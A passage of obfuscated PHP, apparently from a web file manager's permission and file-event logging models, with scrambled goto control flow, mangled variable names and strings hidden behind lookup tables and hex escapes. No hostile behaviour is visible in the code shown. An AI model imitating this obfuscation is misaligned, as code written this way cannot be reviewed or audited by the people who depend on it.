$AÂ∞Ó¥Ó°˘[368] => intval($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[368]]), $AÂ∞Ó¥Ó°˘[452] => intval($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[452]]), $AÂ∞Ó¥Ó°˘[2208] => intval($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[2208]]) ? intval($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[2208]]) : 0, $AÂ∞Ó¥Ó°˘[2209] => intval($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[2209]]) ? intval($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[2209]]) : -1); } goto a¶È…ï˘®‡; a¶È…ï˘®‡: $this->where(array($AÂ∞Ó¥Ó°˘[380] => $fê∏âŒ≠åé))->delete(); $this->addAll($a∑≠‘äµ‹¢); return !0; goto F‰¡Ø´©ûÒ; E≤∑√û§Æ: $f‹™ÇàÕ€… = 1; $cë®áåâé’ = $déó¡°›é¯[$AÂ∞Ó¥Ó°˘[452]]; if ($cë®áåâé’ != $f‹™ÇàÕ€…) { $fƒí∞Íâ‰É = array($AÂ∞Ó¥Ó°˘[2080] => $cë®áåâé’); $A€¨Ö’ÇŒ‹ = Model($AÂ∞Ó¥Ó°˘[2154])->field($AÂ∞Ó¥Ó°˘[1417])->where($fƒí∞Íâ‰É)->select(); $A€¨Ö’ÇŒ‹ = array_to_keyvalue($A€¨Ö’ÇŒ‹, $AÂ∞Ó¥Ó°˘[33], $AÂ∞Ó¥Ó°˘[1417]); } goto aï‰Ú“É∆Ç; F‰¡Ø´©ûÒ: } public function authClear($FÛÈÏ≠æıÌ) { $bñŒÁùëÊÆ =& $_SERVER[—Ω]; $fä√â—èæ¡ = Model($bñŒÁùëÊÆ[1114])->sourceInfo($FÛÈÏ≠æıÌ); $B±“œÀ∂ﬂà = array($FÛÈÏ≠æıÌ); if ($fä√â—èæ¡[$bñŒÁùëÊÆ[367]] == $bñŒÁùëÊÆ[83]) { $EÜ»“Îäëœ = array($bñŒÁùëÊÆ[521] => array($bñŒÁùëÊÆ[479], $fä√â—èæ¡[$bñŒÁùëÊÆ[455]] . $FÛÈÏ≠æıÌ . $bñŒÁùëÊÆ[480])); $B±“œÀ∂ﬂà = Model($bñŒÁùëÊÆ[1114])->field($bñŒÁùëÊÆ[380])->where($EÜ»“Îäëœ)->getField($bñŒÁùëÊÆ[366], !0); $B±“œÀ∂ﬂà[] = $FÛÈÏ≠æıÌ; } $this->where(array($bñŒÁùëÊÆ[380] => array($bñŒÁùëÊÆ[381], $B±“œÀ∂ﬂà)))->delete(); return !0; } public function get($fûäÇç∆π◊) { $CŸï†Ó±ñ◊ = $this->getSourceList(array($fûäÇç∆π◊), !0); return $CŸï†Ó±ñ◊[0]; } public function getSourceList($eÀÍº›¿⁄¡, $Dﬂ™å∆«Ø¯ = false) { goto bÿªª¢ùö√; bÿªª¢ùö√: $f¶§≥ﬂ‘äı =& $_SERVER[—Ω]; if (!$eÀÍº›¿⁄¡) { return array(); } $c·Æ”ô˘Ôû = Model($f¶§≥ﬂ‘äı[1114]); goto a…Ú⁄Í©ùß; c”«¯âëö†: $cË„åøò‰€ = array($f¶§≥ﬂ‘äı[380] => array($f¶§≥ﬂ‘äı[381], $F“ÿòı€›Ì)); $fÑÜ°êˆ⁄¿ = $this->field($b‰ï›á”≥√)->where($cË„åøò‰€)->select(); $fÑÜ°êˆ⁄¿ = array_to_keyvalue_group($fÑÜ°êˆ⁄¿, $f¶§≥ﬂ‘äı[366]); goto EÃë–¬∞ûä; EÃë–¬∞ûä: $e„ê¡ıÃÀ∞ = array(); foreach ($Dﬂ™å∆«Ø¯ as $AÉìëçöÆî => $AŒ‹ê∏åÁÇ) { $e„ê¡ıÃÀ∞[$AÉìëçöÆî] = $this->makeSourceAuth($AŒ‹ê∏åÁÇ, $fÑÜ°êˆ⁄¿); } return $e„ê¡ıÃÀ∞; goto cãÃ≤êÿÇ¥; eÔ•ÏΩÔ’˜: $F“ÿòı€›Ì = array_values(array_unique($F“ÿòı€›Ì)); if (!$F“ÿòı€›Ì) { return array(); } $b‰ï›á”≥√ = $f¶§≥ﬂ‘äı[2230]; goto c”«¯âëö†; a…Ú⁄Í©ùß: if (!$Dﬂ™å∆«Ø¯) { $cË„åøò‰€ = array($f¶§≥ﬂ‘äı[380] => array($f¶§≥ﬂ‘äı[381], $eÀÍº›¿⁄¡)); $Dﬂ™å∆«Ø¯ = $c·Æ”ô˘Ôû->field($f¶§≥ﬂ‘äı[2229])->where($cË„åøò‰€)->select(); $Dﬂ™å∆«Ø¯ = array_to_keyvalue($Dﬂ™å∆«Ø¯, $f¶§≥ﬂ‘äı[366]); } $F“ÿòı€›Ì = $eÀÍº›¿⁄¡; foreach ($Dﬂ™å∆«Ø¯ as $bÙ∆ü≤ÈÖ– => $D–’ª˜√í´) { $a≠«ä¢ïÃë = $c·Æ”ô˘Ôû->parentLevelArray($D–’ª˜√í´[$f¶§≥ﬂ‘äı[455]]); $F“ÿòı€›Ì = array_merge($F“ÿòı€›Ì, $a≠«ä¢ïÃë, array($bÙ∆ü≤ÈÖ–)); } goto eÔ•ÏΩÔ’˜; cãÃ≤êÿÇ¥: } public function authDeepCheck($D•¨•ë‰á≥, $aº’¬§¢öÃ = false) { $EÑˆ¬ÇÊ¨° =& $_SERVER[—Ω]; if (_get($GLOBALS, $EÑˆ¬ÇÊ¨°[453])) { return !1; } $B‚±€Ò≈Ù§ = $this->makeAuthDeep(); if (!in_array($D•¨•ë‰á≥, $B‚±€Ò≈Ù§)) { return !1; } return array($EÑˆ¬ÇÊ¨°[374] => -1, $EÑˆ¬ÇÊ¨°[414] => array($EÑˆ¬ÇÊ¨°[382] => $EÑˆ¬ÇÊ¨°[1035], $EÑˆ¬ÇÊ¨°[2086] => $EÑˆ¬ÇÊ¨°[464], $EÑˆ¬ÇÊ¨°[383] => LNG($EÑˆ¬ÇÊ¨°[2231]), $EÑˆ¬ÇÊ¨°[2098] => $EÑˆ¬ÇÊ¨°[2232])); } protected function makeAuthDeep() { goto D∂ÑÈöÎ≥†; b∏£≤ﬂØ∑Ø: $eá¿ìπË®∂ = array_values(array_unique($eá¿ìπË®∂)); $Bîƒƒ¨£Ë± = $eá¿ìπË®∂; foreach ($Bîƒƒ¨£Ë± as $DóûﬂáØ¬¿) { $Bﬂ åªµ—† = $eèÁõƒÜÍ±->getInfo($DóûﬂáØ¬¿); $F‰ªæ€‰óÑ = $Cü€©µáü∂->parentLevelArray($Bﬂ åªµ—†[$Aùî¡ÒÑ≤ø[455]]); $eá¿ìπË®∂ = array_merge($eá¿ìπË®∂, $F‰ªæ€‰óÑ); } goto EÑı ß¿ ‹; FäÓ‚“≤Ö‹: $Eí‹ßÖŒÊ∞ = Model($Aùî¡ÒÑ≤ø[2233])->listData(); $C‘¨ÑıâÜã = array(); foreach ($Eí‹ßÖŒÊ∞ as $bˆÁ–ÜΩÚÉ) { if ($bˆÁ–ÜΩÚÉ[$Aùî¡ÒÑ≤ø[373]] == 0 && $bˆÁ–ÜΩÚÉ[$Aùî¡ÒÑ≤ø[2100]] == $Aùî¡ÒÑ≤ø[83]) { $C‘¨ÑıâÜã[] = $bˆÁ–ÜΩÚÉ[$Aùî¡ÒÑ≤ø[364]]; } } goto a∫êƒëå‚≠; EÑı ß¿ ‹: $eá¿ìπË®∂ = array_values(array_unique($eá¿ìπË®∂)); foreach ($eá¿ìπË®∂ as $DóûﬂáØ¬¿) { $Bﬂ åªµ—† = $eèÁõƒÜÍ±->getInfo($DóûﬂáØ¬¿); $eó±„üƒßÂ[] = $Bﬂ åªµ—†[$Aùî¡ÒÑ≤ø[388]][$Aùî¡ÒÑ≤ø[366]]; } $eó±„üƒßÂ = array_values(array_unique($eó±„üƒßÂ)); goto eß‚ÔéÜóè; eß‚ÔéÜóè: return $eó±„üƒßÂ; goto eÉ©£ÁÜæÑ; a∫êƒëå‚≠: $dÆì§∑È‰Â = Session::get($Aùî¡ÒÑ≤ø[2192]); $dÆì§∑È‰Â = array_to_keyvalue($dÆì§∑È‰Â, $Aùî¡ÒÑ≤ø[33], $Aùî¡ÒÑ≤ø[2080]); $f≈›•€ÜÖû = array($Aùî¡ÒÑ≤ø[368] => SourceModel::TYPE_USER, $Aùî¡ÒÑ≤ø[452] => USER_ID); goto dπà‹€Œ¥Ó; fÁ∂å‡≈∞ø: $C…÷∫öÿ⁄¥ = array_to_keyvalue($fÒèÉÕÃ∑œ, $Aùî¡ÒÑ≤ø[33], $Aùî¡ÒÑ≤ø[366]); $eó±„üƒßÂ = array(); $eá¿ìπË®∂ = $dÆì§∑È‰Â; goto aïÔ¥™´Çê; aïÔ¥™´Çê: $Cü€©µáü∂ = Model($Aùî¡ÒÑ≤ø[1114]); $eèÁõƒÜÍ± = Model($Aùî¡ÒÑ≤ø[454]); if ($C…÷∫öÿ⁄¥) { $eÖ”ÑÊÚöª = $Cü€©µáü∂->where(array($Aùî¡ÒÑ≤ø[366] => array($Aùî¡ÒÑ≤ø[381], $C…÷∫öÿ⁄¥)))->select(); foreach ($eÖ”ÑÊÚöª as $cá¬‹ÂÍíﬁ) { $F‰ªæ€‰óÑ = $Cü€©µáü∂->parentLevelArray($cá¬‹ÂÍíﬁ[$Aùî¡ÒÑ≤ø[455]]); $eó±„üƒßÂ = array_merge($eó±„üƒßÂ, $F‰ªæ€‰óÑ); $eá¿ìπË®∂[] = $cá¬‹ÂÍíﬁ[$Aùî¡ÒÑ≤ø[452]]; } } goto b∏£≤ﬂØ∑Ø; D∂ÑÈöÎ≥†: $Aùî¡ÒÑ≤ø =& $_SERVER[—Ω]; static $eó±„üƒßÂ = false; if ($eó±„üƒßÂ) { return $eó±„üƒßÂ; } goto FäÓ‚“≤Ö‹; dπà‹€Œ¥Ó: if ($dÆì§∑È‰Â) { $f≈›•€ÜÖû = array(array($Aùî¡ÒÑ≤ø[368] => SourceModel::TYPE_USER, $Aùî¡ÒÑ≤ø[452] => USER_ID), array($Aùî¡ÒÑ≤ø[368] => SourceModel::TYPE_GROUP, $Aùî¡ÒÑ≤ø[452] => array($Aùî¡ÒÑ≤ø[381], $dÆì§∑È‰Â)), $Aùî¡ÒÑ≤ø[920] => $Aùî¡ÒÑ≤ø[2160]); } if ($C‘¨ÑıâÜã) { $f≈›•€ÜÖû = array($f≈›•€ÜÖû, $Aùî¡ÒÑ≤ø[2208] => array($Aùî¡ÒÑ≤ø[2234], $C‘¨ÑıâÜã)); } $fÒèÉÕÃ∑œ = $this->field($Aùî¡ÒÑ≤ø[2235])->where($f≈›•€ÜÖû)->select(); goto fÁ∂å‡≈∞ø; eÉ©£ÁÜæÑ: } private function makeSourceAuth($eòƒ◊ºö≥√, $fë»Ã«ÁÛ±) { goto FÈµ¨å¥›ƒ; FÈµ¨å¥›ƒ: $c”•Âó≥Ú† =& $_SERVER[—Ω]; $cóÒƒ≤˘í† = Session::get($c”•Âó≥Ú†[2192]); $d˜„‹ù£‹∂ = Model($c”•Âó≥Ú†[1114])->parentLevelArray($eòƒ◊ºö≥√[$c”•Âó≥Ú†[455]]); goto B…ÍÑ£ª⁄⁄; B…ÍÑ£ª⁄⁄: $d˜„‹ù£‹∂ = array_merge(array($eòƒ◊ºö≥√[$c”•Âó≥Ú†[366]]), array_reverse($d˜„‹ù£‹∂)); $c†èì√≠óÁ = !1; foreach ($d˜„‹ù£‹∂ as $fØä—à≥§¿) { if (!isset($fë»Ã«ÁÛ±[$fØä—à≥§¿])) { continue; } $AÑÓ§≠£Œï = $this->authMake($fë»Ã«ÁÛ±[$fØä—à≥§¿]); if ($AÑÓ§≠£Œï[$c”•Âó≥Ú†[414]]) { $c†èì√≠óÁ = $AÑÓ§≠£Œï; break; } } goto cÛ…›ó¥àÜ; cÛ…›ó¥àÜ: if (!$c†èì√≠óÁ) { $cóÒƒ≤˘í† = array_to_keyvalue($cóÒƒ≤˘í†, $c”•Âó≥Ú†[2080]); $aƒë÷ëﬂ∞∑ = $eòƒ◊ºö≥√[$c”•Âó≥Ú†[452]]; $d£˜ºôÇ§Ú = isset($cóÒƒ≤˘í†[$aƒë÷ëﬂ∞∑]) ? $cóÒƒ≤˘í†[$aƒë÷ëﬂ∞∑] : !1; if ($d£˜ºôÇ§Ú) { $c†èì√≠óÁ = array($c”•Âó≥Ú†[2236] => intval($d£˜ºôÇ§Ú[$c”•Âó≥Ú†[373]][$c”•Âó≥Ú†[373]]), $c”•Âó≥Ú†[2237] => $d£˜ºôÇ§Ú[$c”•Âó≥Ú†[373]]); } } if ((!$c†èì√≠óÁ || $c†èì√≠óÁ[$c”•Âó≥Ú†[374]] <= 0) && $eòƒ◊ºö≥√[$c”•Âó≥Ú†[368]] == SourceModel::TYPE_GROUP) { $CäíÛ —Ïç = $this->authDeepCheck($eòƒ◊ºö≥√[$c”•Âó≥Ú†[366]], $c†èì√≠óÁ); if ($CäíÛ —Ïç) { $c†èì√≠óÁ = $CäíÛ —Ïç; } } return $c†èì√≠óÁ; goto B®üÖÀÃØﬂ; B®üÖÀÃØﬂ: } public function authOwnerApply($dïÓó∏óµœ) { goto dõáÓ“Ìëﬁ; dó£˜»éÊŸ: $dïÓó∏óµœ[$EöˆêÕ∆à˘[373]][$EöˆêÕ∆à˘[2240]] = Model($EöˆêÕ∆à˘[470])->userListInfo($d…ÓäÉ∂œ˘); return $dïÓó∏óµœ; goto EÂ‰ÕÖ‹óâ; dõáÓ“Ìëﬁ: $EöˆêÕ∆à˘ =& $_SERVER[—Ω]; if (empty($dïÓó∏óµœ[$EöˆêÕ∆à˘[373]]) || isset($dïÓó∏óµœ[$EöˆêÕ∆à˘[2238]]) && $dïÓó∏óµœ[$EöˆêÕ∆à˘[2238]]) { return $dïÓó∏óµœ; } if (AuthModel::authCheckRoot($dïÓó∏óµœ[$EöˆêÕ∆à˘[373]][$EöˆêÕ∆à˘[374]])) { return $dïÓó∏óµœ; } goto fÖœÆŸò◊ﬁ; B©¿Ü≥äÇ®: if (count($d…ÓäÉ∂œ˘) == 0) { $d…ÓäÉ∂œ˘ = $this->authFolderOwnerGroup($dïÓó∏óµœ[$EöˆêÕ∆à˘[452]]); } $d…ÓäÉ∂œ˘ = array_unique($d…ÓäÉ∂œ˘); if (AuthModel::authCheckRoot($dïÓó∏óµœ[$EöˆêÕ∆à˘[373]][$EöˆêÕ∆à˘[374]])) { $d…ÓäÉ∂œ˘[] = USER_ID; } goto dó£˜»éÊŸ; fÖœÆŸò◊ﬁ: $eøà©‡ﬁù„ = Model($EöˆêÕ∆à˘[1114])->parentLevelArray($dïÓó∏óµœ[$EöˆêÕ∆à˘[455]]); $eøà©‡ﬁù„ = array_merge(array($dïÓó∏óµœ[$EöˆêÕ∆à˘[366]]), array_reverse($eøà©‡ﬁù„)); $Aãë∞´ÆÇÔ = $EöˆêÕ∆à˘[2230]; goto Aâ…â∫«ÿ–; Aâ…â∫«ÿ–: $dïÚˆùÈŒè = array($EöˆêÕ∆à˘[380] => array($EöˆêÕ∆à˘[381], $eøà©‡ﬁù„)); $Aﬁ‡“£µËπ = $this->field($Aãë∞´ÆÇÔ)->where($dïÚˆùÈŒè)->select(); $Aﬁ‡“£µËπ = array_to_keyvalue_group($Aﬁ‡“£µËπ, $EöˆêÕ∆à˘[366]); goto A§éü“úÒÒ; A§éü“úÒÒ: $eûÈªâ¡®ú = array(); $d…ÓäÉ∂œ˘ = array(); foreach ($Aﬁ‡“£µËπ as $c√î»¶†–´ => $dÃ–é⁄øáª) { $Eä·ŸØæ´¥ = $this->authFolderOwnerUser($dÃ–é⁄øáª); $eûÈªâ¡®ú[$c√î»¶†–´] = $Eä·ŸØæ´¥; $d…ÓäÉ∂œ˘ = array_merge($d…ÓäÉ∂œ˘, $Eä·ŸØæ´¥[$EöˆêÕ∆à˘[531]]); if ($Eä·ŸØæ´¥[$EöˆêÕ∆à˘[2239]]) { break; } } goto B©¿Ü≥äÇ®; EÂ‰ÕÖ‹óâ: } private function authFolderOwnerGroup($Dåﬁ∂ÊÜóÃ) { $b∫⁄è⁄¯Ï∆ =& $_SERVER[—Ω]; $FüÕÀ„ã‡à = Model($b∫⁄è⁄¯Ï∆[2154])->where(array($b∫⁄è⁄¯Ï∆[2080] => $Dåﬁ∂ÊÜóÃ))->select(); $bˆêÂÉ¬‰ƒ = array(); if (!$FüÕÀ„ã‡à) { return $bˆêÂÉ¬‰ƒ; } foreach ($FüÕÀ„ã‡à as $D≠¶°Ò˜õÖ) { $a®»Œåâ∞ú = $this->authInfo($D≠¶°Ò˜õÖ); if (AuthModel::authCheckRoot($a®»Œåâ∞ú[$b∫⁄è⁄¯Ï∆[373]])) { $bˆêÂÉ¬‰ƒ[] = $D≠¶°Ò˜õÖ[$b∫⁄è⁄¯Ï∆[1417]]; } } return $bˆêÂÉ¬‰ƒ; } private function authFolderOwnerUser($d∫ ¢œË∂Í) { $fçÂ„±©ëû =& $_SERVER[—Ω]; $C÷‰Úƒ‹‚’ = array(); $B‹∏ÙªåÛ„ = !1; foreach ($d∫ ¢œË∂Í as $EÕàÁëÏ ô) { $CÉæÒÓ…èÉ = $this->authInfo($EÕàÁëÏ ô); if ($EÕàÁëÏ ô[$fçÂ„±©ëû[452]] == $fçÂ„±©ëû[464]) { $B‹∏ÙªåÛ„ = !0; } if ($EÕàÁëÏ ô[$fçÂ„±©ëû[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($CÉæÒÓ…èÉ[$fçÂ„±©ëû[373]])) { $C÷‰Úƒ‹‚’[] = $EÕàÁëÏ ô[$fçÂ„±©ëû[452]]; } } } return array($fçÂ„±©ëû[531] => $C÷‰Úƒ‹‚’, $fçÂ„±©ëû[2239] => $B‹∏ÙªåÛ„); } public function authMake($A ı˜’ËﬂÆ) { goto CåÌéíáﬁÀ; D¶©Ã¥øØ—: $eäïúîï›ó = $a‹Ö™ãüŸÙ ? $f•ìﬂ’°‹ó : ($bÉäÏ«å Ü ? $e∑î¢Èçü : $c“áÔíõ¬”); $a√àÔŸπúú = array($EÇÍÔŸ©ÙÌ[2236] => intval($c≈ËòÉ⁄ùπ), $EÇÍÔŸ©ÙÌ[2237] => $eäïúîï›ó); return $a√àÔŸπúú; goto e√Á∏◊êÙá; aÙä·›®⁄‰: $AŸ§õœ–›‰ = 0; foreach ($A ı˜’ËﬂÆ as $AÉÃ¡û≤§ª) { $eäïúîï›ó = $this->authInfo($AÉÃ¡û≤§ª); $dæÚøÙØ∑¨ = $AÉÃ¡û≤§ª[$EÇÍÔŸ©ÙÌ[452]]; $bïÛ≠ö≠Æô = intval($eäïúîï›ó[$EÇÍÔŸ©ÙÌ[373]]); if ($AÉÃ¡û≤§ª[$EÇÍÔŸ©ÙÌ[368]] == SourceModel::TYPE_USER && $dæÚøÙØ∑¨ == USER_ID) { $a‹Ö™ãüŸÙ = !0; $f•ìﬂ’°‹ó = $eäïúîï›ó; $d‚öƒß∂∑⁄ = $bïÛ≠ö≠Æô; } else { if ($AÉÃ¡û≤§ª[$EÇÍÔŸ©ÙÌ[368]] == SourceModel::TYPE_GROUP && in_array($dæÚøÙØ∑¨, $FÖïƒÍ∞¥)) { $bÉäÏ«å Ü = !0; if ($bïÛ≠ö≠Æô >= $bπø…¥ë‰∑) { $bπø…¥ë‰∑ = $bïÛ≠ö≠Æô; $e∑î¢Èçü = $eäïúîï›ó; } } else { if ($dæÚøÙØ∑¨ == $EÇÍÔŸ©ÙÌ[464]) { $AŸ§õœ–›‰ = !0; $c“áÔíõ¬” = $eäïúîï›ó; $B®§∫»∆Ûœ = $bïÛ≠ö≠Æô; } } } } $c≈ËòÉ⁄ùπ = $a‹Ö™ãüŸÙ ? $d‚öƒß∂∑⁄ : ($bÉäÏ«å Ü ? $bπø…¥ë‰∑ : $B®§∫»∆Ûœ); goto D¶©Ã¥øØ—; b‘ÈÂ…Óµ’: $B®§∫»∆Ûœ = 0; $f•ìﬂ’°‹ó = 0; $e∑î¢Èçü = 0; goto cÉﬁÙ⁄ñÎÎ; CåÌéíáﬁÀ: $EÇÍÔŸ©ÙÌ =& $_SERVER[—Ω]; if (!$A ı˜’ËﬂÆ) { return array($EÇÍÔŸ©ÙÌ[374] => 0, $EÇÍÔŸ©ÙÌ[414] => !1); } $dú‚Ë‹°å† = Session::get($EÇÍÔŸ©ÙÌ[2192]); goto b·Ω‘õãö‡; cÉﬁÙ⁄ñÎÎ: $c“áÔíõ¬” = 0; $a‹Ö™ãüŸÙ = 0; $bÉäÏ«å Ü = 0; goto aÙä·›®⁄‰; b·Ω‘õãö‡: $FÖïƒÍ∞¥ = array_to_keyvalue($dú‚Ë‹°å†, $EÇÍÔŸ©ÙÌ[33], $EÇÍÔŸ©ÙÌ[2080]); $d‚öƒß∂∑⁄ = 0; $bπø…¥ë‰∑ = 0; goto b‘ÈÂ…Óµ’; e√Á∏◊êÙá: } public function authTargetInfoMake($e›õ¯ıÉ«◊) { goto Eó„ŒÑÌÀÊ; fø˜≥ÆÚΩé: foreach ($e›õ¯ıÉ«◊ as $aöàã®“ﬁÑ) { if ($aöàã®“ﬁÑ[$D∞ïÿÿ∏¥‡[368]] == SourceModel::TYPE_USER) { $fÁâÃñôöÕ[] = intval($aöàã®“ﬁÑ[$D∞ïÿÿ∏¥‡[452]]); } else { if ($aöàã®“ﬁÑ[$D∞ïÿÿ∏¥‡[368]] == SourceModel::TYPE_GROUP) { $E¥å∂ÓÉ√≥[] = intval($aöàã®“ﬁÑ[$D∞ïÿÿ∏¥‡[452]]); } } } if ($fÁâÃñôöÕ) { $fÁâÃñôöÕ = Model($D∞ïÿÿ∏¥‡[470])->userListInfo($fÁâÃñôöÕ); } if ($E¥å∂ÓÉ√≥) { $BÙÒÙ»…¿Æ = array($D∞ïÿÿ∏¥‡[2152] => array($D∞ïÿÿ∏¥‡[381], $E¥å∂ÓÉ√≥)); $E¥å∂ÓÉ√≥ = Model($D∞ïÿÿ∏¥‡[454])->field($D∞ïÿÿ∏¥‡[2165])->where($BÙÒÙ»…¿Æ)->select(); $E¥å∂ÓÉ√≥ = array_to_keyvalue($E¥å∂ÓÉ√≥, $D∞ïÿÿ∏¥‡[2080]); } goto Cú≤ùﬁÿ„Â; Cú≤ùﬁÿ„Â: return array($D∞ïÿÿ∏¥‡[2241] => $fÁâÃñôöÕ, $D∞ïÿÿ∏¥‡[2242] => $E¥å∂ÓÉ√≥); goto dØˆï¶«Ã‘; Eó„ŒÑÌÀÊ: $D∞ïÿÿ∏¥‡ =& $_SERVER[—Ω]; $fÁâÃñôöÕ = array(); $E¥å∂ÓÉ√≥ = array(); goto fø˜≥ÆÚΩé; dØˆï¶«Ã‘: } private function authInfo($cŸ¡·ˆ∂Õ‹) { $A∫ÖèÃŸË÷ =& $_SERVER[—Ω]; if ($cŸ¡·ˆ∂Õ‹[$A∫ÖèÃŸË÷[2208]]) { $eÒ„Ò‚≈µπ = Model($A∫ÖèÃŸË÷[2227])->listData($cŸ¡·ˆ∂Õ‹[$A∫ÖèÃŸË÷[2208]]); if (!$eÒ„Ò‚≈µπ) { return !1; $D¶©ôÜ∆“Ç = Model($A∫ÖèÃŸË÷[2227])->listData(); $fŸ±˘Ø”æÒ = array_filter_by_field($D¶©ôÜ∆“Ç, $A∫ÖèÃŸË÷[373], $A∫ÖèÃŸË÷[464]); return $fŸ±˘Ø”æÒ; } $c©ëßÉóäë = array_field_key($eÒ„Ò‚≈µπ, array($A∫ÖèÃŸË÷[364], $A∫ÖèÃŸË÷[28], $A∫ÖèÃŸË÷[373], $A∫ÖèÃŸË÷[2098], $A∫ÖèÃŸË÷[2101])); $c©ëßÉóäë[$A∫ÖèÃŸË÷[2243]] = $cŸ¡·ˆ∂Õ‹; return $c©ëßÉóäë; } else { return array($A∫ÖèÃŸË÷[382] => 0, $A∫ÖèÃŸË÷[2086] => $cŸ¡·ˆ∂Õ‹[$A∫ÖèÃŸË÷[2209]], $A∫ÖèÃŸË÷[383] => $A∫ÖèÃŸË÷[33], $A∫ÖèÃŸË÷[2098] => $A∫ÖèÃŸË÷[2244]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\145\137\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\162\145\141\164\x65\124\x69\x6d\x65", "\x74\x69\155\x65", "\x69\x6e\163\x65\162\164", "\146\165\156\x63\x74\151\157\x6e"), array("\144\145\x73\143", '', "\151\x6e\x73\145\x72\x74\54\x75\x70\x64\141\x74\145\54\x73\x65\x6c\145\143\164", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($CØ„íı©ûÉ, $EÕ•‰È˜ÉÑ, $FÜ≥”ÇíÎÙ = '') { goto c€÷çë—¥∑; dÇÑ±éí’Œ: $CÂè›’ìô‡ = array($bÑÆﬁ’ÀÈÒ[380] => $CØ„íı©ûÉ, $bÑÆﬁ’ÀÈÒ[2245] => $cÏ‚òå⁄ê⁄[$bÑÆﬁ’ÀÈÒ[457]], $bÑÆﬁ’ÀÈÒ[2246] => $cÏ‚òå⁄ê⁄[$bÑÆﬁ’ÀÈÒ[28]], $bÑÆﬁ’ÀÈÒ[462] => $cÏ‚òå⁄ê⁄[$bÑÆﬁ’ÀÈÒ[462]], $bÑÆﬁ’ÀÈÒ[1408] => USER_ID, $bÑÆﬁ’ÀÈÒ[385] => $EÕ•‰È˜ÉÑ, $bÑÆﬁ’ÀÈÒ[1410] => $FÜ≥”ÇíÎÙ); $this->addSystemLog($EÕ•‰È˜ÉÑ, $CÂè›’ìô‡); return $this->add($CÂè›’ìô‡); goto fê∏ª˜ÎË±; B”–∆ÇÕå : if (!$cÏ‚òå⁄ê⁄) { return !1; } if ($this->isCacheEvent($cÏ‚òå⁄ê⁄, $EÕ•‰È˜ÉÑ)) { return; } if ($FÜ≥”ÇíÎÙ && is_string($FÜ≥”ÇíÎÙ)) { $FÜ≥”ÇíÎÙ = array($bÑÆﬁ’ÀÈÒ[2110] => $FÜ≥”ÇíÎÙ); } goto dÇÑ±éí’Œ; c€÷çë—¥∑: $bÑÆﬁ’ÀÈÒ =& $_SERVER[—Ω]; if (!$this->eventSave) { return; } $cÏ‚òå⁄ê⁄ = Model($bÑÆﬁ’ÀÈÒ[1114])->sourceInfo($CØ„íı©ûÉ); goto B”–∆ÇÕå ; fê∏ª˜ÎË±: } private function addSystemLog($aŸ≥Ì ¶ù¢, $Eñå©ƒÉåı) { $c¥ô”íıÏ¥ =& $_SERVER[—Ω]; if ($aŸ≥Ì ¶ù¢ == $c¥ô”íıÏ¥[2247]) { $aŸ≥Ì ¶ù¢ = $Eñå©ƒÉåı[$c¥ô”íıÏ¥[401]][$c¥ô”íıÏ¥[2248]]; } else { if (in_array($aŸ≥Ì ¶ù¢, array($c¥ô”íıÏ¥[2057], $c¥ô”íıÏ¥[2249]))) { $aŸ≥Ì ¶ù¢ = $Eñå©ƒÉåı[$c¥ô”íıÏ¥[401]][$c¥ô”íıÏ¥[702]]; } } $EàûÖê√ì = array_merge($Eñå©ƒÉåı, array($c¥ô”íıÏ¥[2250] => $Eñå©ƒÉåı[$c¥ô”íıÏ¥[366]], $c¥ô”íıÏ¥[2251] => $Eñå©ƒÉåı[$c¥ô”íıÏ¥[2251]])); Model($c¥ô”íıÏ¥[2021])->addLog($c¥ô”íıÏ¥[2252] . $aŸ≥Ì ¶ù¢, $EàûÖê√ì); } private function isCacheEvent($eæœÙÎÖâµ, $d†®”ÿˆΩ‰) { if ($eæœÙÎÖâµ[$_SERVER[—Ω][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($DΩèø“ûˆº, $A∞Ãé¬™√“) { $E’Ã∆Úÿ¯≈ =& $_SERVER[—Ω]; $bÉÇå≥Ñ•ù = Model($E’Ã∆Úÿ¯≈[1114])->sourceInfo($DΩèø“ûˆº); $CÍòÏ‘àë˘ = array($E’Ã∆Úÿ¯≈[2248] => $A∞Ãé¬™√“, $E’Ã∆Úÿ¯≈[28] => $bÉÇå≥Ñ•ù[$E’Ã∆Úÿ¯≈[28]]); return $this->addEvent($DΩèø“ûˆº, $E’Ã∆Úÿ¯≈[2247], $CÍòÏ‘àë˘); } public function eventFileEdit($D’÷íàÓﬁá) { $f—Ò§Ôã§Ü =& $_SERVER[—Ω]; $B≠ªàœÛ—Í = array($f—Ò§Ôã§Ü[2253] => $_SERVER[$f—Ò§Ôã§Ü[2254]], $f—Ò§Ôã§Ü[1727] => strtolower(ACTION)); return $this->addEvent($D’÷íàÓﬁá, $f—Ò§Ôã§Ü[2048], $B≠ªàœÛ—Í); } public function eventRecycle($DÑí“¯Ìï“, $FãÜóŒ⁄π’) { return $this->addEvent($DÑí“¯Ìï“, $_SERVER[—Ω][2249], $FãÜóŒ⁄π’); } public function eventRemove($E°™ç“Î©√) { $e™µ÷‘ØÜÒ =& $_SERVER[—Ω]; $DùÆÚ¬∑‘Ê = Model($e™µ÷‘ØÜÒ[1114])->sourceInfo($E°™ç“Î©√); $Cÿ≤‹ı˜Ãæ = $DùÆÚ¬∑‘Ê[$e™µ÷‘ØÜÒ[28]]; return $this->addEvent($DùÆÚ¬∑‘Ê[$e™µ÷‘ØÜÒ[457]], $e™µ÷‘ØÜÒ[2047], $Cÿ≤‹ı˜Ãæ); } public function eventShare($f§Ó¶…Êóè, $EñÃºø©úà) { return $this->addEvent($f§Ó¶…Êóè, $_SERVER[—Ω][2057], $EñÃºø©úà); } public function eventMove($f©üÎﬁ·Ç≈, $BÊ©ÆÁèè, $EÏÛä®åì ) { goto Dôûôöè‘Ü; D¿˜Áèﬁîê: 